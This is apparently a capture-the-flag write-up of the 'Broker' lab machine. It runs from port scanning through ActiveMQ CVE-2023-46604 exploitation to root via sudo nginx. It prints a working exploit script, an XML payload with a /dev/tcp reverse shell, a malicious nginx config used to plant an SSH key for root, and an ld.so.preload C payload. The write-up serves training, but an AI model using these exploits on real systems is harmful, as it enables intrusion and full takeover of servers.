### Summary
We begin the box noticing an `ActiveMQ` and `OpenWire` Java environment. We log into the `Apache ActiveMQ` instance on port `80` with the default credentials `admin:admin` to find that we're running an RCE vulnerable version of `ActiveMQ`. We're quickly able to spawn a bash reverse shell to find that the user `activemq` is able to run `nginx` as `sudo`, giving us arbitrary read and write to the filesystem. We generate `ssh` keypairs and write the public key to `/root/.ssh/authorized_keys` to get a root shell on the box

### Tools
- `nginx`
- `ssh-keygen`
- `gcc`

###### [[#Recon]]
- [[#Initial Scan]]
- [[#HTTP - TCP 80]]
###### [[#User Shell - activemq]]
- [[#Apache ActiveMQ Deserialization of Untrusted Data (CVE-2023-46604)]]
	- [[#poc.py]]
	- [[#poc.xml]]
- [[#Enumeration as activemq]]
###### [[#Root Shell]]
- [[#nginx as sudo]]
	- [[#malicious nginx conf]]
- [[#Load Shared Object]]
	- [[#pwn.c]]

---
# Recon
## Initial Scan
---
```sh
❯ sudo nmap -p- --min-rate 10000 -vv $IP -oN nmap/tcp
PORT      STATE SERVICE     REASON
22/tcp    open  ssh         syn-ack ttl 63
80/tcp    open  http        syn-ack ttl 63
1883/tcp  open  mqtt        syn-ack ttl 63
5672/tcp  open  amqp        syn-ack ttl 63
8161/tcp  open  patrol-snmp syn-ack ttl 63
42975/tcp open  unknown     syn-ack ttl 63
61613/tcp open  unknown     syn-ack ttl 63
61614/tcp open  unknown     syn-ack ttl 63
61616/tcp open  unknown     syn-ack ttl 63
```
```sh
❯ sudo nmap -p 22,80,1883,5672,8161,42975,61613,61614,61616 -sCV -vv $IP -oN nmap/tcpScripts       
PORT      STATE SERVICE    REASON         VERSION
22/tcp    open  ssh        syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ+m7rYl1vRtnm789pH3IRhxI4CNCANVj+N5kovboNzcw9vHsBwvPX3KYA3cxGbKiA0VqbKRpOHnpsMuHEXEVJc=
|   256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOtuEdoYxTohG80Bo6YCqSzUY9+qbnAFnhsk4yAZNqhM
80/tcp    open  http       syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
| http-auth:
| HTTP/1.1 401 Unauthorized\x0D
|_  basic realm=ActiveMQRealm
|_http-title: Error 401 Unauthorized
|_http-server-header: nginx/1.18.0 (Ubuntu)
1883/tcp  open  mqtt       syn-ack ttl 63
| mqtt-subscribe:
|   Topics and their most recent payloads:
|     ActiveMQ/Advisory/MasterBroker:
|_    ActiveMQ/Advisory/Consumer/Topic/#:
5672/tcp  open  amqp?      syn-ack ttl 63
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GetRequest, HTTPOptions, RPCCheck, RTSPRequest, SSLSessionReq, TerminalServerCookie:
|     AMQP
|     AMQP
|     amqp:decode-error
|_    7Connection from client using unsupported AMQP attempted
|_amqp-info: ERROR: AQMP:handshake expected header (1) frame, but was 65
8161/tcp  open  http       syn-ack ttl 63 Jetty 9.4.39.v20210325
|_http-title: Error 401 Unauthorized
| http-auth:
| HTTP/1.1 401 Unauthorized\x0D
|_  basic realm=ActiveMQRealm
|_http-server-header: Jetty(9.4.39.v20210325)
42975/tcp open  tcpwrapped syn-ack ttl 63
61613/tcp open  stomp      syn-ack ttl 63 Apache ActiveMQ
| fingerprint-strings:
|   HELP4STOMP:
|     ERROR
|     content-type:text/plain
|     message:Unknown STOMP action: HELP
|     org.apache.activemq.transport.stomp.ProtocolException: Unknown STOMP action: HELP
|     org.apache.activemq.transport.stomp.ProtocolConverter.onStompCommand(ProtocolConverter.java:258)
|     org.apache.activemq.transport.stomp.StompTransportFilter.onCommand(StompTransportFilter.java:85)
|     org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)
|     org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:233)
|     org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:215)
|_    java.lang.Thread.run(Thread.java:750)
61614/tcp open  http       syn-ack ttl 63 Jetty 9.4.39.v20210325
|_http-title: Site doesn\'t have a title.
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
| http-methods:
|   Supported Methods: GET HEAD TRACE OPTIONS
|_  Potentially risky methods: TRACE
|_http-server-header: Jetty(9.4.39.v20210325)
61616/tcp open  apachemq   syn-ack ttl 63 ActiveMQ OpenWire transport
| fingerprint-strings:
|   NULL:
|     ActiveMQ
|     TcpNoDelayEnabled
|     SizePrefixDisabled
|     CacheSize
|     ProviderName
|     ActiveMQ
|     StackTraceEnabled
|     PlatformDetails
|     Java
|     CacheEnabled
|     TightEncodingEnabled
|     MaxFrameSize
|     MaxInactivityDuration
|     MaxInactivityDurationInitalDelay
|     ProviderVersion
|_    5.15.15
3 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port5672-TCP:V=7.92%I=7%D=3/3%Time=69A72265%P=x86_64-redhat-linux-gnu%r
SF:(GetRequest,89,"AMQP\x03\x01\0\0AMQP\0\x01\0\0\0\0\0\x19\x02\0\0\0\0S\x
SF:10\xc0\x0c\x04\xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x02\0\0\0\0S\x18\xc0S\
SF:x01\0S\x1d\xc0M\x02\xa3\x11amqp:decode-error\xa17Connection\x20from\x20
SF:client\x20using\x20unsupported\x20AMQP\x20attempted")%r(HTTPOptions,89,
SF:"AMQP\x03\x01\0\0AMQP\0\x01\0\0\0\0\0\x19\x02\0\0\0\0S\x10\xc0\x0c\x04\
SF:xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x02\0\0\0\0S\x18\xc0S\x01\0S\x1d\xc0M
SF:\x02\xa3\x11amqp:decode-error\xa17Connection\x20from\x20client\x20using
SF:\x20unsupported\x20AMQP\x20attempted")%r(RTSPRequest,89,"AMQP\x03\x01\0
SF:\0AMQP\0\x01\0\0\0\0\0\x19\x02\0\0\0\0S\x10\xc0\x0c\x04\xa1\0@p\0\x02\0
SF:\0`\x7f\xff\0\0\0`\x02\0\0\0\0S\x18\xc0S\x01\0S\x1d\xc0M\x02\xa3\x11amq
SF:p:decode-error\xa17Connection\x20from\x20client\x20using\x20unsupported
SF:\x20AMQP\x20attempted")%r(RPCCheck,89,"AMQP\x03\x01\0\0AMQP\0\x01\0\0\0
SF:\0\0\x19\x02\0\0\0\0S\x10\xc0\x0c\x04\xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0`
SF:\x02\0\0\0\0S\x18\xc0S\x01\0S\x1d\xc0M\x02\xa3\x11amqp:decode-error\xa1
SF:7Connection\x20from\x20client\x20using\x20unsupported\x20AMQP\x20attemp
SF:ted")%r(DNSVersionBindReqTCP,89,"AMQP\x03\x01\0\0AMQP\0\x01\0\0\0\0\0\x
SF:19\x02\0\0\0\0S\x10\xc0\x0c\x04\xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x02\0
SF:\0\0\0S\x18\xc0S\x01\0S\x1d\xc0M\x02\xa3\x11amqp:decode-error\xa17Conne
SF:ction\x20from\x20client\x20using\x20unsupported\x20AMQP\x20attempted")%
SF:r(DNSStatusRequestTCP,89,"AMQP\x03\x01\0\0AMQP\0\x01\0\0\0\0\0\x19\x02\
SF:0\0\0\0S\x10\xc0\x0c\x04\xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x02\0\0\0\0S
SF:\x18\xc0S\x01\0S\x1d\xc0M\x02\xa3\x11amqp:decode-error\xa17Connection\x
SF:20from\x20client\x20using\x20unsupported\x20AMQP\x20attempted")%r(SSLSe
SF:ssionReq,89,"AMQP\x03\x01\0\0AMQP\0\x01\0\0\0\0\0\x19\x02\0\0\0\0S\x10\
SF:xc0\x0c\x04\xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x02\0\0\0\0S\x18\xc0S\x01
SF:\0S\x1d\xc0M\x02\xa3\x11amqp:decode-error\xa17Connection\x20from\x20cli
SF:ent\x20using\x20unsupported\x20AMQP\x20attempted")%r(TerminalServerCook
SF:ie,89,"AMQP\x03\x01\0\0AMQP\0\x01\0\0\0\0\0\x19\x02\0\0\0\0S\x10\xc0\x0
SF:c\x04\xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x02\0\0\0\0S\x18\xc0S\x01\0S\x1
SF:d\xc0M\x02\xa3\x11amqp:decode-error\xa17Connection\x20from\x20client\x2
SF:0using\x20unsupported\x20AMQP\x20attempted");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port61613-TCP:V=7.92%I=7%D=3/3%Time=69A72260%P=x86_64-redhat-linux-gnu%
SF:r(HELP4STOMP,27F,"ERROR\ncontent-type:text/plain\nmessage:Unknown\x20ST
SF:OMP\x20action:\x20HELP\n\norg\.apache\.activemq\.transport\.stomp\.Prot
SF:ocolException:\x20Unknown\x20STOMP\x20action:\x20HELP\n\tat\x20org\.apa
SF:che\.activemq\.transport\.stomp\.ProtocolConverter\.onStompCommand\(Pro
SF:tocolConverter\.java:258\)\n\tat\x20org\.apache\.activemq\.transport\.s
SF:tomp\.StompTransportFilter\.onCommand\(StompTransportFilter\.java:85\)\
SF:n\tat\x20org\.apache\.activemq\.transport\.TransportSupport\.doConsume\
SF:(TransportSupport\.java:83\)\n\tat\x20org\.apache\.activemq\.transport\
SF:.tcp\.TcpTransport\.doRun\(TcpTransport\.java:233\)\n\tat\x20org\.apach
SF:e\.activemq\.transport\.tcp\.TcpTransport\.run\(TcpTransport\.java:215\
SF:)\n\tat\x20java\.lang\.Thread\.run\(Thread\.java:750\)\n\0\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port61616-TCP:V=7.92%I=7%D=3/3%Time=69A72260%P=x86_64-redhat-linux-gnu%
SF:r(NULL,140,"\0\0\x01<\x01ActiveMQ\0\0\0\x0c\x01\0\0\x01\*\0\0\0\x0c\0\x
SF:11TcpNoDelayEnabled\x01\x01\0\x12SizePrefixDisabled\x01\0\0\tCacheSize\
SF:x05\0\0\x04\0\0\x0cProviderName\t\0\x08ActiveMQ\0\x11StackTraceEnabled\
SF:x01\x01\0\x0fPlatformDetails\t\0\x04Java\0\x0cCacheEnabled\x01\x01\0\x1
SF:4TightEncodingEnabled\x01\x01\0\x0cMaxFrameSize\x06\0\0\0\0\x06@\0\0\0\
SF:x15MaxInactivityDuration\x06\0\0\0\0\0\0u0\0\x20MaxInactivityDurationIn
SF:italDelay\x06\0\0\0\0\0\0'\x10\0\x0fProviderVersion\t\0\x075\.15\.15");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
- The TTL lines up with a posix adherent system
- OpenSSH and nginx versions line up with Ubuntu `22.04`
- The Webserver on ports `80` and `8161` are broadcasting information regarding `ActiveMQRealm`
	- They're giving Error `401`, unauthorized (likely just websocket communication via `STOMP`)
- ports `61613` and `61616` both reference [`ActiveMQ`](https://activemq.apache.org/) as well, a multi-protocol, java-based message broker utilizing `AMQP`. Messages are exchanged via `STOMP` over websockets. `MQTT` is used to manage IoT devices
	- Port `1833` is running `MQTT`
	- `5672` is running `AMQP`
	- `61613` is running `STOMP`
	- `61614` is a web server running `Jetty`

## HTTP - TCP 80
---
- When we access the webserver on port `80`, we're immediately prompted with a login popup
- Looking up `ActiveMQ` default credentials, we find that they're `admin:admin` which work to authenticate us!

- We're greeted with an Apache `ActiveMQ` instance, version `5.15.15` 
- We can search for CVEs online for this version of `ActiveMQ` and we quickly find a `CVSS 10.0` remote code execution vulnerability, [CVE-2023-46604](https://www.cvedetails.com/cve/CVE-2023-46604/) > 

> This vulnerability may allow a remote attacker with network access to either a Java-based OpenWire broker or client to run arbitrary shell commands by manipulating serialized class types in the OpenWire protocol to cause either the client or the broker (respectively) to instantiate any class on the classpath.

# User Shell - activemq
## Apache ActiveMQ Deserialization of Untrusted Data (CVE-2023-46604)
---
- A [Github POC](https://github.com/evkl1d/CVE-2023-46604) exists, along with a Metasploit module
	- The POC comes with a python script and an XML file
- There's also a [medium post](https://removepaywalls.com/https://deepkondah.medium.com/unpacking-the-apache-activemq-exploit-cve-2023-46604-92ed1c125b53) that explains the vulnerability in more detail
	- Essentially, an unauthenticated user can create throwable classes, and the deserialization process will call the user-defined throwable class on exception without validating
	- The user-defined throwable class of choice is `ClassPathXmlApplicationContext`, a standalone XML application context and an implementation of Spring's `ApplicationContext`, allowing the creation of applications via an XML file

### poc.py
```python
import socket 
import argparse 
 
def main(ip, port, url): 
    if not ip or not url: 
        print("Usage: script.py -i <ip> -p <port> -u <url>") 
        return 
     
    banner() 
     
    class_name = "org.springframework.context.support.ClassPathXmlApplicationContext" 
    message = url 
 
    header = "1f00000000000000000001" 
    body = header + "01" + int2hex(len(class_name), 4) + string2hex(class_name) + "01" + int2hex(len(message), 4) + string2hex(message) 
    payload = int2hex(len(body) // 2, 8) + body 
    data = bytes.fromhex(payload) 
 
    print("[*] Target:", f"{ip}:{port}") 
    print("[*] XML URL:", url) 
    print() 
    print("[*] Sending packet:", payload) 
 
    conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
    conn.connect((ip, int(port))) 
    conn.send(data) 
    conn.close() 
 
def banner(): 
    print("     _        _   _           __  __  ___        ____   ____ _____ \n    / \\   ___| |_(_)_   _____|  \\/  |/ _ \\      |  _ \\ / ___| ____|\n   / _ \\ / __| __| \\ \\ / / _ \\ |\\/| | | | |_____| |_) | |   |  _|  \n  / ___ \\ (__| |_| |\\ V /  __/ |  | | |_| |_____|  _ <| |___| |___ \n /_/   \\_\\___|\\__|_| \\_/ \\___|_|  |_|\\__\\_\\     |_| \\_\\\\____|_____|\n") 
 
def string2hex(s): 
    return s.encode().hex() 
 
def int2hex(i, n): 
    if n == 4: 
        return format(i, '04x') 
    elif n == 8: 
        return format(i, '08x') 
    else: 
        raise ValueError("n must be 4 or 8") 
 
if __name__ == "__main__": 
    parser = argparse.ArgumentParser() 
    parser.add_argument("-i", "--ip", help="ActiveMQ Server IP or Host") 
    parser.add_argument("-p", "--port", default="61616", help="ActiveMQ Server Port") 
    parser.add_argument("-u", "--url", help="Spring XML Url") 
    args = parser.parse_args() 
     
    main(args.ip, args.port, args.url)
```
- The python script takes the victim's IP, `ActiveMQ` Server port, and Spring XML Url and serializes it for the `OpenWire` protocol

### poc.xml
```xml
<?xml version="1.0" encoding="UTF-8" ?>
    <beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="
     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
        <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
            <constructor-arg>
            <list>
                <value>bash</value>
                <value>-c</value>
                <value>bash -i &gt;&amp; /dev/tcp/10.10.10.10/9001 0&gt;&amp;1</value>
            </list>
            </constructor-arg>
        </bean>
    </beans>
```
- The xml file performs a bash reverse shell

- First, we need to host a webserver to host the `poc.xml` via `python3 -m http.server 12346`
- Then, we spin up a `netcat` listener corresponding with our `xml` defined bash reverse shell
- Finally, we pass the proper flags to the python exploit
```sh
❯ python3 exploit.py -i 10.129.230.87 -u http://10.10.15.234:12346/poc.xml
```
```sh
❯ nc -lvnp 12345                            
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::12345
Ncat: Listening on 0.0.0.0:12345
Ncat: Connection from 10.129.230.87.
Ncat: Connection from 10.129.230.87:33854.
bash: cannot set terminal process group (866): Inappropriate ioctl for device
bash: no job control in this shell
activemq@broker:/opt/apache-activemq-5.15.15/bin$ 
```
- Then we can perform a standard `script -c bash /dev/null` shell upgrade

## Enumeration as activemq
---
- We can immediately grab `user.txt`
```sh
activemq@broker:/opt/apache-activemq-5.15.15/bin$ cat ~/user.txt 
a10caa6471eeed3001daf5fdf575183e
```

- There's a config directory in the `apache-activemq-...` parent directory but there's nothing overtly interesting in it
- There are no interesting files in the user's home directory
- We can passwordless sudo to find:
```sh
activemq@broker:/opt/apache-activemq-5.15.15/conf$ sudo -l
Matching Defaults entries for activemq on broker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User activemq may run the following commands on broker:
    (ALL : ALL) NOPASSWD: /usr/sbin/nginx
```

# Root Shell
## nginx as sudo
---
- We can peek at the [GTFObins entry for nginx](https://gtfobins.org/gtfobins/nginx/) 
	- An interesting section is the `Upload`, where we can gain arbitrary read access on the box
- First, we need to create an `nginx` config, ensuring that the root path is the root directory of the victim's filesystem
### malicious nginx conf
```text
user root;
http {
  server {
    listen 12345;
    root /;
    autoindex on;
    dav_methods PUT;
  }
}
events {}
```

- Then we execute the `nginx -c /path/to/conf`
```sh
activemq@broker:/tmp$ sudo nginx -c /tmp/malicious.conf
```

- We can verify it worked with `ss -lptn` and seeing that port `12345` is now active
```sh
activemq@broker:/tmp$ curl http://localhost:12345
<html>
<head><title>Index of /</title></head>
<body>
<h1>Index of /</h1><hr><pre><a href="../">../</a>
<a href="bin/">bin/</a>                                               06-Nov-2023 01:10                   -
<a href="boot/">boot/</a>                                              06-Nov-2023 01:38                   -
<a href="dev/">dev/</a>                                               05-Mar-2026 00:06                   -
<a href="etc/">etc/</a>                                               07-Nov-2023 06:53                   -
<a href="home/">home/</a>                                              06-Nov-2023 01:18                   -
<a href="lib/">lib/</a>                                               06-Nov-2023 00:57                   -
<a href="lib32/">lib32/</a>                                             17-Feb-2023 17:19                   -
<a href="lib64/">lib64/</a>                                             05-Nov-2023 02:36                   -
<a href="libx32/">libx32/</a>                                            17-Feb-2023 17:19                   -
<a href="lost%2Bfound/">lost+found/</a>                                        27-Apr-2023 15:40                   -
<a href="media/">media/</a>                                             06-Nov-2023 01:18                   -
<a href="mnt/">mnt/</a>                                               17-Feb-2023 17:19                   -
<a href="opt/">opt/</a>                                               06-Nov-2023 01:18                   -
<a href="proc/">proc/</a>                                              05-Mar-2026 00:06                   -
<a href="root/">root/</a>                                              05-Mar-2026 00:07                   -
<a href="run/">run/</a>                                               05-Mar-2026 00:06                   -
<a href="sbin/">sbin/</a>                                              06-Nov-2023 01:10                   -
<a href="srv/">srv/</a>                                               06-Nov-2023 01:18                   -
<a href="sys/">sys/</a>                                               05-Mar-2026 00:06                   -
<a href="tmp/">tmp/</a>                                               05-Mar-2026 01:01                   -
<a href="usr/">usr/</a>                                               17-Feb-2023 17:19                   -
<a href="var/">var/</a>                                               05-Nov-2023 01:43                   -
</pre><hr></body>
</html>
```

- We can get the `root.txt` file like so:
```sh
activemq@broker:/tmp$ curl http://localhost:12345/root/root.txt
25851cfb941b1e448cbaf0105d0990cf
```

- We could also use this as an arbitrary write, adding a known public `ssh` key to `/root/.ssh/authorized_keys`

- First, we generate an `ssh` key on our attack box
```sh
❯ ssh-keygen -t ed25519 -C 'nobody@nothing'
❯ cat id_ed25519.pub             
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHNJOZ/HhajZii/KUw3HVL5OvZGltb05cSjcdQYDw6Ex nobody@nothing
```

- Then, on the victim machine we'll execute the following:
```sh
activemq@broker:/tmp$ curl -X PUT http://localhost:12345/root/.ssh/authorized_keys -d 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHNJOZ/HhajZii/KUw3HVL5OvZGltb05cSjcdQYDw6Ex nobody@nothing'
```

- Finally, on our attacker box, we can use the private key we generated to `ssh` in as `root`!
```sh
❯ ssh -i id_ed25519 root@10.129.230.87 
...
root@broker:~# cat ~/root.txt 
25851cfb941b1e448cbaf0105d0990cf
```

## Load Shared Object 
---
- There's also a way to set the nginx error log as `ld.so.preload` (shared object that loads a list of ELF files before the program is run)
- Here's a [link to the steps](https://0xdf.gitlab.io/2023/11/09/htb-broker.html#load-so-alternative) 

### pwn.c
```c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
__attribute__ ((__constructor__))
void dropshell(void){
   chown("/tmp/rootshell", 0, 0);
   chmod("/tmp/rootshell", 04755); 
   unlink("/etc/ld.so.preload");
   printf("[+] done!\n");
}

// gcc -fPIC -shared -ldl -o /tmp/pwn.so pwn.c
```

